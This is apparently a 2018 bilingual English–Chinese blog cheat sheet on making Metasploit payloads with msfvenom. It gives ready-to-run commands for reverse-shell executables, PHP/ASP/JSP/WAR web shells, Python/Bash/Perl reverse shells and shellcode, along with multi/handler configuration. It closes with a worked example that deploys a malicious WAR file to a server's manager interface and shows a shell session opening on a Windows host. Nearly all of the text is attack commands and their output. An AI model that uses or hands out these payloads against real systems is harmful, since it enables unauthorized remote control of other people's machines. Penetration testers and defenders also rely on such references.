# Creating Metasploit Payloads 创建Metasploit有效负载

------

Often one of the most useful (and to the beginner underrated) abilities of Metasploit is the msfpayload module. Multiple payloads can be created with this module and it helps something that can give you a shell in almost any situation. For each of these payloads you can go into msfconsole and select exploit/multi/handler. Run ‘set payload’ for the relevant payload used and configure all necessary options (LHOST, LPORT, etc). Execute and wait for the payload to be run. For the examples below it’s pretty self explanatory but LHOST should be filled in with your IP address (LAN IP if attacking within the network, WAN IP if attacking across the internet), and LPORT should be the port you wish to be connected back on.

通常，Metasploit最有用（以及初学者被低估）的能力之一是msfpayload模块。使用此模块可以创建多个有效负载，它可以帮助您在几乎任何情况下都能获得shell。对于每个有效负载，您可以进入msfconsole并选择exploit / multi / handler。为所使用的相关有效负载运行'set payload'并配置所有必需的选项（LHOST，LPORT等）。执行并等待有效负载运行。对于下面的示例，它是非常自我解释但LHOST应填入您的IP地址（如果在网络内攻击，则为LAN IP，如果通过互联网进行攻击则为WAN IP），LPORT应该是您希望重新连接的端口。

------

## List payloads 列出有效负载

```txt
msfvenom -l
```

---

## Binaries 二进制

### Linux

```txt
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
```

### Windows

```txt
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe
```

### Mac

```txt
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho
```

---

## Web Payloads 网络有效负载

### PHP

```txt
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```

### ASP

```txt
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
```

### JSP

```txt
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp
```

### WAR

```txt
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war
```

---

## Scripting Payloads 脚本有效负载

### Python

```txt
msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py
```

### Bash

```txt
msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh
```

### Perl

```txt
msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl
```

---

## Shellcode

For all shellcode see ‘msfvenom –help-formats’ for information as to valid parameters. Msfvenom will output code that is able to be cut and pasted in this language for your exploits.

对于所有shellcode，请参阅'msfvenom -help-formats'以获取有效信息 参数。Msfvenom将输出能够以此语言剪切和粘贴的代码以供您利用。

### Linux Based Shellcode 基于Linux的Shellcode

```txt
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

### Windows Based Shellcode 基于Windows的Shellcode

```txt
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

### Mac Based Shellcode 基于Mac的Shellcode

```txt
msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f <language>
```

---

## Handlers 处理程序

Metasploit handlers can be great at quickly setting up Metasploit to be in a position to receive your incoming shells. Handlers should be in the following format.

Metasploit处理程序可以很好地快速设置Metasploit以便接收您的传入shell。处理程序应采用以下格式。

```txt
use exploit/multi/handler
set PAYLOAD <Payload name>
set LHOST <LHOST value>
set LPORT <LPORT value>
set ExitOnSession false
exploit -j -z
```

Once the required values are completed the following command will execute your handler – ‘msfconsole -L -r ‘

完成所需的值后，以下命令将执行您的处理程序 - 'msfconsole -L -r “

---

## 示例说明

生成包含反向TCP shell的恶意WAR文件。相应地配置本地IP和端口。

```txt
msfvenom -p java/shell_reverse_tcp LHOST=172.16.245.143 LPORT=4444 -f war > shell3.war
```

在Metasploit中设置处理程序然后访问manger接口以部署恶意WAR。上传后，请务必至少访问一次恶意URL（在应用程序列表中可用）以使WAR执行。你应该在Metasploit处理程序中收到一个shell。

```txt
use exploit/multi/handler
set PAYLOAD java/shell_reverse_tcp
set LHOST 172.16.245.143
set LPORT 4444
set ExitOnSession false
exploit -j -z
```

```txt
[i] Database already started
[i] The database appears to be already configured, skipping initialization
                                                  
  +-------------------------------------------------------+
  |  METASPLOIT by Rapid7                                 |
  +---------------------------+---------------------------+
  |      __________________   |                           |
  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |
  |             )=\           | |  EXPLOIT   \            |
  |            // \\          | |_____________\_______    |
  |           //   \\         | |==[msf >]============\   |
  |          //     \\        | |______________________\  |
  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |
  |        //         \\      |  *********************    |
  +---------------------------+---------------------------+
  |      o O o                |        \'\/\/\/'/         |
  |              o O          |         )======(          |
  |                 o         |       .'  LOOT  '.        |
  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |
  | |    PAYLOAD     |""\___, |     /    (_||_     \      |
  | |________________|__|)__| |    |     __||_)     |     |
  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |
  |  = = = = = = = = = = = =  |     '--------------'      |
  +---------------------------+---------------------------+


       =[ metasploit v4.17.3-dev                          ]
+ -- --=[ 1795 exploits - 1019 auxiliary - 310 post       ]
+ -- --=[ 538 payloads - 41 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD java/shell_reverse_tcp
PAYLOAD => java/shell_reverse_tcp
msf exploit(multi/handler) > set LHOST 172.16.245.143
LHOST => 172.16.245.143
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf exploit(multi/handler) > exploit -j -z
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 172.16.245.143:4444 
msf exploit(multi/handler) > [*] Command shell session 1 opened (172.16.245.143:4444 -> 172.16.245.1:53088) at 2018-10-18 02:37:15 +0800
msf exploit(multi/handler) > sessions -l

Active sessions
===============

  Id  Name  Type             Information                                                                       Connection
  --  ----  ----             -----------                                                                       ----------
  1         shell java/java  Microsoft Windows [_ 6.1.7601] _ (c) 2009 Microsoft Corporation_ C:\Program F...  172.16.245.143:4444 -> 172.16.245.1:53088 (172.16.245.1)
```

![Snipaste_2018-10-18_02-40-23.png](https://whitecell.io/upload/attach/201810/151_96N9ENZ9F99TJP5.png "Snipaste_2018-10-18_02-40-23.png")

![Snipaste_2018-10-18_02-42-05.png](https://whitecell.io/upload/attach/201810/151_G5C94KHFNR42UWN.png "Snipaste_2018-10-18_02-42-05.png")

------

博客作者，文章总结者 [@Mannix][1]      
2018 年 10 月 18 日

原始参考文档 [@Creating Metasploit Payloads][2]      

[1]: http://mannix.top/
[2]: https://netsec.ws/?p=331






